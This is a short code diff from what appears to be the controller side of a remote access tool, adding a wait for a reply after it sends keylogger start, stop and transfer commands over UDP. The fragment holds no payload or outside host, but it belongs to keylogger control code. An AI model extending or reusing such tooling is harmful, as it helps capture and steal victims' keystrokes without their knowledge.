@@ -171,6 +171,7 @@ if __name__ == "__main__":
             if argv[0] == KEYLOGGER:
                 if argv[1] in [START, STOP, TRANSFER]:
                     send_udp(data)
+                    receive_single_response()
                 continue
             if argv[0] == WATCH:
                 send_udp(data)
